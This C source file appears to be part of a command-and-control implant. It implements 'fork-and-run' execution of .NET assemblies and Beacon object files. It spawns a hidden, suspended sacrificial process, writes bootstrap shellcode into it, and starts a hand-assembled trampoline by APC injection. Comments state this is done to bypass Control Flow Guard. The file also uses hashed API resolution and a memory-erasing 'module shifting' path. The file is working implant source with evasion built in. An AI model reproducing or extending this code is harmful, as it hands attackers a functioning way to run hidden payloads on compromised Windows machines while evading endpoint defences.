#include "config.h"

// Fork-and-run infrastructure: gated on execute_assembly OR inline_execute
#if defined(INCLUDE_CMD_EXECUTE_ASSEMBLY) || defined(INCLUDE_CMD_INLINE_EXECUTE)

#include "evasion/fork_and_run.h"
#include "evasion/injection.h"

// ---------- CLR bootstrap bytes (compiled from clr_bootstrap.cc) ----------
// Built by: make clr-stub-x64
// Source:   src/evasion/clr_bootstrap.cc
// The builder compiles this separately and stamps the bytes into config.h.
// If CLR_BOOTSTRAP_BYTES is not defined, fork-and-run for execute_assembly
// falls back to an error.
#ifdef CLR_BOOTSTRAP_SIZE
#define HAS_CLR_STUB 1
#else
#define HAS_CLR_STUB 0
#endif

#ifdef BOF_BOOTSTRAP_SIZE
#define HAS_BOF_STUB 1
#else
#define HAS_BOF_STUB 0
#endif

// -------- Helpers --------

typedef BOOL (WINAPI *fnCreatePipe_t)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef BOOL (WINAPI *fnSetHandleInformation_t)(HANDLE, DWORD, DWORD);

BOOL fork_spawn(PINSTANCE inst, FORK_CTX* ctx) {
    es_memset(ctx, 0, sizeof(FORK_CTX));

    xstr(_s_CreatePipe, "CreatePipe");
    fnCreatePipe_t pCreatePipe = (fnCreatePipe_t)resolve_function(
        inst->Modules.Kernel32, hash_string_djb2(_s_CreatePipe));
    if (!pCreatePipe) return FALSE;

    SECURITY_ATTRIBUTES sa;
    es_memset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    if (!pCreatePipe(&ctx->hPipeRead, &ctx->hPipeWrite, &sa, 0))
        return FALSE;

    // Don't let the child inherit the read end
    xstr(_s_SetHandleInformation, "SetHandleInformation");
    fnSetHandleInformation_t pSetHandleInfo = (fnSetHandleInformation_t)resolve_function(
        inst->Modules.Kernel32, hash_string_djb2(_s_SetHandleInformation));
    if (pSetHandleInfo)
        pSetHandleInfo(ctx->hPipeRead, 1 /*HANDLE_FLAG_INHERIT*/, 0);

    // Build command line from spawnto
    char* app = inst->Spawnto.x64;
    char* app_args = inst->Spawnto.x64_args;
    if (!app[0]) {
        inst->Win32.CloseHandle(ctx->hPipeRead);
        inst->Win32.CloseHandle(ctx->hPipeWrite);
        return FALSE;
    }

    wchar_t wcmd[600];
    es_memset(wcmd, 0, sizeof(wcmd));
    inst->Win32.MultiByteToWideChar(0, 0, app, -1, wcmd, 299);
    if (app_args[0]) {
        int pos = 0;
        while (wcmd[pos]) pos++;
        wcmd[pos++] = L' ';
        inst->Win32.MultiByteToWideChar(0, 0, app_args, -1, wcmd + pos, 299);
    }

    STARTUPINFOW si;
    es_memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = 0x101; // STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES
    si.wShowWindow = 0;  // SW_HIDE
    si.hStdInput  = NULL;
    si.hStdOutput = ctx->hPipeWrite;
    si.hStdError  = ctx->hPipeWrite;

    PROCESS_INFORMATION pi;
    es_memset(&pi, 0, sizeof(pi));

    DWORD flags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
    if (inst->BlockDlls)
        flags |= 0x00100000; // PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES

    BOOL ok = inst->Win32.CreateProcessW(
        NULL, wcmd, NULL, NULL, TRUE /*bInheritHandles*/,
        flags, NULL, NULL, &si, &pi);

    if (!ok) {
        inst->Win32.CloseHandle(ctx->hPipeRead);
        inst->Win32.CloseHandle(ctx->hPipeWrite);
        return FALSE;
    }

    ctx->hProcess = pi.hProcess;
    ctx->hThread  = pi.hThread;
    ctx->dwPid    = pi.dwProcessId;

    return TRUE;
}

BOOL fork_collect_output(PINSTANCE inst, FORK_CTX* ctx,
                         BYTE** output, DWORD* output_len, DWORD timeout_ms)
{
    // Close write end in parent so pipe gets EOF when child exits
    if (ctx->hPipeWrite) {
        inst->Win32.CloseHandle(ctx->hPipeWrite);
        ctx->hPipeWrite = NULL;
    }

    // Wait for child to finish
    inst->Win32.WaitForSingleObject(ctx->hProcess, timeout_ms);

    // Drain pipe
    BYTE* buf = NULL;
    DWORD cap = 0, len = 0;
    DWORD avail = 0, bytes_read = 0;

    while (TRUE) {
        avail = 0;
        if (!inst->Win32.PeekNamedPipe(ctx->hPipeRead, NULL, 0, NULL, &avail, NULL))
            break;
        if (avail == 0) break;

        if (len + avail + 1 > cap) {
            DWORD new_cap = cap == 0 ? 4096 : cap;
            while (new_cap < len + avail + 1) new_cap *= 2;
            BYTE* nb = (BYTE*)es_realloc(inst, buf, new_cap);
            if (!nb) break;
            buf = nb;
            cap = new_cap;
        }

        bytes_read = 0;
        inst->Win32.ReadFile(ctx->hPipeRead, buf + len, avail, &bytes_read, NULL);
        len += bytes_read;
    }

    if (buf && len > 0) buf[len] = '\0';
    *output = buf;
    *output_len = len;
    return TRUE;
}

VOID fork_cleanup(PINSTANCE inst, FORK_CTX* ctx) {
    if (ctx->hProcess) {
        inst->Win32.TerminateProcess(ctx->hProcess, 0);
        inst->Win32.CloseHandle(ctx->hProcess);
    }
    if (ctx->hThread)
        inst->Win32.CloseHandle(ctx->hThread);
    if (ctx->hPipeRead)
        inst->Win32.CloseHandle(ctx->hPipeRead);
    if (ctx->hPipeWrite)
        inst->Win32.CloseHandle(ctx->hPipeWrite);
    es_memset(ctx, 0, sizeof(FORK_CTX));
}

// -------- Trampoline for injection-technique-agnostic parameter passing --------
//
// Standard inject_shellcode_into() doesn't pass parameters to the shellcode.
// We build a 22-byte x64 trampoline that sets RCX = data_ptr, then jumps to
// the bootstrap entry. This trampoline IS the injected shellcode - it works
// with CRT, APC, Section, and Custom injection techniques alike.
//
//   mov rcx, <data_addr>     ; 48 B9 [8 bytes]
//   mov rax, <bootstrap>     ; 48 B8 [8 bytes]
//   jmp rax                  ; FF E0
//
#define TRAMPOLINE_SIZE 22

static BOOL fork_inject_trampoline(PINSTANCE inst, HANDLE hProcess,
                                   HANDLE hThread,
                                   LPVOID remote_data, LPVOID remote_code)
{
    BYTE tramp[TRAMPOLINE_SIZE];
    // mov rcx, imm64 (data pointer)
    tramp[0] = 0x48; tramp[1] = 0xB9;
    *(UINT64*)(tramp + 2) = (UINT64)(ULONG_PTR)remote_data;
    // mov rax, imm64 (bootstrap entry)
    tramp[10] = 0x48; tramp[11] = 0xB8;
    *(UINT64*)(tramp + 12) = (UINT64)(ULONG_PTR)remote_code;
    // jmp rax
    tramp[20] = 0xFF; tramp[21] = 0xE0;

    // Allocate + write the trampoline into the sacrifice process
    LPVOID remote_tramp = gate_VirtualAllocEx(inst, hProcess, NULL, TRAMPOLINE_SIZE,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote_tramp) return FALSE;

    SIZE_T written = 0;
    gate_WriteProcessMemory(inst, hProcess, remote_tramp, tramp, TRAMPOLINE_SIZE, &written);

    DWORD old_protect = 0;
    gate_VirtualProtectEx(inst, hProcess, remote_tramp, TRAMPOLINE_SIZE,
        PAGE_EXECUTE_READ, &old_protect);

    // Use APC on the already-suspended main thread to bypass CFG.
    // CreateRemoteThread / NtCreateThreadEx start addresses go through
    // BaseThreadInitThunk which validates the target against the CFG bitmap.
    // Anonymous memory is never in the bitmap → FAST_FAIL_GUARD_ICALL_CHECK_FAILURE.
    // APC execution bypasses this check entirely: the kernel queues the APC
    // and the thread resumes into it without a CFG dispatch.
    inst->Win32.QueueUserAPC((PAPCFUNC)remote_tramp, hThread, 0);
    gate_ResumeThread(inst, hThread);

    return TRUE;
}

// -------- Fork-and-run: execute_assembly --------
//
// Data layout injected into the sacrifice:
//   Region 1 (RW): [DWORD asm_len][DWORD args_len][asm_bytes...][args_str...]
//   Region 2 (RX): [CLR bootstrap PIC shellcode]
//
// The bootstrap is started as a remote thread with lpParameter = Region 1.
// It hosts CLR v4, loads the assembly, invokes its entry point. Output goes
// to inherited stdout which is piped back to us.

BOOL fork_run_assembly(PINSTANCE inst,
                       BYTE* asm_data, DWORD asm_len,
                       const char* args_str, DWORD args_len,
                       BYTE** output, DWORD* output_len)
{
#if !HAS_CLR_STUB
    (void)inst; (void)asm_data; (void)asm_len;
    (void)args_str; (void)args_len; (void)output; (void)output_len;
    return FALSE;
#else
    // ── Shift-and-restore path (module shifting) ──
    // Run the CLR bootstrap inside a shifted DLL section in this process;
    // the bootstrap artifact is erased from memory when the run completes.
    // Falls back to the remote fork path below if the shift fails.
#if defined(INCLUDE_EVASION_MODULE_SHIFT) && defined(MODULE_SHIFT_BOOTSTRAP)
    {
        BYTE* shift_out = NULL;
        DWORD shift_len = 0;
        if (module_shift_run_assembly(inst, asm_data, asm_len, args_str, args_len,
                                      &shift_out, &shift_len)) {
            *output = shift_out;
            *output_len = shift_len;
            return TRUE;
        }
    }
#endif
    FORK_CTX ctx;
    if (!fork_spawn(inst, &ctx))
        return FALSE;

    // --- Build data region ---
    // Layout: [DWORD asm_len][DWORD args_len][UINT64 pipe_handle][asm_bytes...][args_str...]
    DWORD data_len = 8 + 8 + asm_len + args_len;
    BYTE* data_buf = (BYTE*)es_malloc(inst, data_len);
    if (!data_buf) { fork_cleanup(inst, &ctx); return FALSE; }

    *(DWORD*)(data_buf + 0) = asm_len;
    *(DWORD*)(data_buf + 4) = args_len;
    *(UINT64*)(data_buf + 8) = (UINT64)(ULONG_PTR)ctx.hPipeWrite;
    es_memcpy(data_buf + 16, asm_data, asm_len);
    if (args_str && args_len > 0)
        es_memcpy(data_buf + 16 + asm_len, (PVOID)args_str, args_len);

    // Write data region (RW) into child
    LPVOID remote_data = gate_VirtualAllocEx(inst, ctx.hProcess, NULL, data_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote_data) {
        es_free(inst, data_buf);
        fork_cleanup(inst, &ctx);
        return FALSE;
    }

    SIZE_T written = 0;
    if (!gate_WriteProcessMemory(inst, ctx.hProcess, remote_data, data_buf, data_len, &written)
        || written != data_len) {
        es_free(inst, data_buf);
        fork_cleanup(inst, &ctx);
        return FALSE;
    }
    es_free(inst, data_buf);

    // Write CLR bootstrap code (RX) into child
    LPVOID remote_code = gate_VirtualAllocEx(inst, ctx.hProcess, NULL, CLR_BOOTSTRAP_SIZE,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote_code) {
        fork_cleanup(inst, &ctx);
        return FALSE;
    }

    written = 0;
    if (!gate_WriteProcessMemory(inst, ctx.hProcess, remote_code,
            (PVOID)CLR_BOOTSTRAP_BYTES, CLR_BOOTSTRAP_SIZE, &written)
        || written != CLR_BOOTSTRAP_SIZE) {
        fork_cleanup(inst, &ctx);
        return FALSE;
    }

    // Flip code region to RX
    DWORD old_protect = 0;
    gate_VirtualProtectEx(inst, ctx.hProcess, remote_code, CLR_BOOTSTRAP_SIZE,
        PAGE_EXECUTE_READ, &old_protect);

    // Inject trampoline via APC on the suspended main thread (CFG-safe).
    // The trampoline sets RCX = remote_data, then jumps to the CLR bootstrap.
    if (!fork_inject_trampoline(inst, ctx.hProcess, ctx.hThread, remote_data, remote_code)) {
        fork_cleanup(inst, &ctx);
        return FALSE;
    }

    // Collect output (60s timeout for CLR init + assembly execution)
    fork_collect_output(inst, &ctx, output, output_len, 60000);

    fork_cleanup(inst, &ctx);
    return TRUE;
#endif // HAS_CLR_STUB
}

// -------- Fork-and-run: inline_execute (BOF) --------
//
// Data layout injected into the sacrifice:
//   Region 1 (RW): [DWORD bof_len][DWORD args_len][bof_bytes...][bof_args...]
//   Region 2 (RX): [BOF bootstrap PIC shellcode]
//
// The bootstrap contains an embedded COFF loader + Beacon API stubs.
// It loads and runs the BOF's go() function, pipes BeaconOutput to stdout.

BOOL fork_run_bof(PINSTANCE inst,
                  BYTE* bof_data, DWORD bof_len,
                  BYTE* bof_args, DWORD bof_args_len,
                  BYTE** output, DWORD* output_len)
{
#if !HAS_BOF_STUB
    (void)inst; (void)bof_data; (void)bof_len;
    (void)bof_args; (void)bof_args_len; (void)output; (void)output_len;
    return FALSE;
#else
    // ── Shift-and-restore path (module shifting) ──
    // Run the BOF bootstrap inside a shifted DLL section in this process;
    // erased from memory when the run completes. Falls back to the remote
    // fork path below if the shift fails.
#if defined(INCLUDE_EVASION_MODULE_SHIFT) && defined(MODULE_SHIFT_BOOTSTRAP)
    {
        BYTE* shift_out = NULL;
        DWORD shift_len = 0;
        if (module_shift_run_bof(inst, bof_data, bof_len, bof_args, bof_args_len,
                                 &shift_out, &shift_len)) {
            *output = shift_out;
            *output_len = shift_len;
            return TRUE;
        }
    }
#endif
    FORK_CTX ctx;
    if (!fork_spawn(inst, &ctx))
        return FALSE;

    // --- Build data region ---
    // Layout: [DWORD bof_len][DWORD args_len][UINT64 pipe_handle][bof_bytes...][bof_args...]
    // The pipe handle is passed directly so the bootstrap doesn't need GetStdHandle
    // (which returns NULL in CREATE_NO_WINDOW processes without a console).
    DWORD data_len = 8 + 8 + bof_len + bof_args_len;
    BYTE* data_buf = (BYTE*)es_malloc(inst, data_len);
    if (!data_buf) { fork_cleanup(inst, &ctx); return FALSE; }

    *(DWORD*)(data_buf + 0) = bof_len;
    *(DWORD*)(data_buf + 4) = bof_args_len;
    *(UINT64*)(data_buf + 8) = (UINT64)(ULONG_PTR)ctx.hPipeWrite;
    es_memcpy(data_buf + 16, bof_data, bof_len);
    if (bof_args && bof_args_len > 0)
        es_memcpy(data_buf + 16 + bof_len, bof_args, bof_args_len);

    // Write data region (RW) into child
    LPVOID remote_data = gate_VirtualAllocEx(inst, ctx.hProcess, NULL, data_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote_data) {
        es_free(inst, data_buf);
        fork_cleanup(inst, &ctx);
        return FALSE;
    }

    SIZE_T written = 0;
    if (!gate_WriteProcessMemory(inst, ctx.hProcess, remote_data, data_buf, data_len, &written)
        || written != data_len) {
        es_free(inst, data_buf);
        fork_cleanup(inst, &ctx);
        return FALSE;
    }
    es_free(inst, data_buf);

    // Write BOF bootstrap code (RX) into child
    LPVOID remote_code = gate_VirtualAllocEx(inst, ctx.hProcess, NULL, BOF_BOOTSTRAP_SIZE,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote_code) {
        fork_cleanup(inst, &ctx);
        return FALSE;
    }

    written = 0;
    if (!gate_WriteProcessMemory(inst, ctx.hProcess, remote_code,
            (PVOID)BOF_BOOTSTRAP_BYTES, BOF_BOOTSTRAP_SIZE, &written)
        || written != BOF_BOOTSTRAP_SIZE) {
        fork_cleanup(inst, &ctx);
        return FALSE;
    }

    DWORD old_protect = 0;
    gate_VirtualProtectEx(inst, ctx.hProcess, remote_code, BOF_BOOTSTRAP_SIZE,
        PAGE_EXECUTE_READ, &old_protect);

    // Inject trampoline via APC on the suspended main thread (CFG-safe).
    // The trampoline sets RCX = remote_data, then jumps to the BOF bootstrap.
    if (!fork_inject_trampoline(inst, ctx.hProcess, ctx.hThread, remote_data, remote_code)) {
        fork_cleanup(inst, &ctx);
        return FALSE;
    }

    // Collect output (60s timeout for BOF execution)
    fork_collect_output(inst, &ctx, output, output_len, 60000);

    fork_cleanup(inst, &ctx);
    return TRUE;
#endif // HAS_BOF_STUB
}

#endif // INCLUDE_CMD_EXECUTE_ASSEMBLY || INCLUDE_CMD_INLINE_EXECUTE
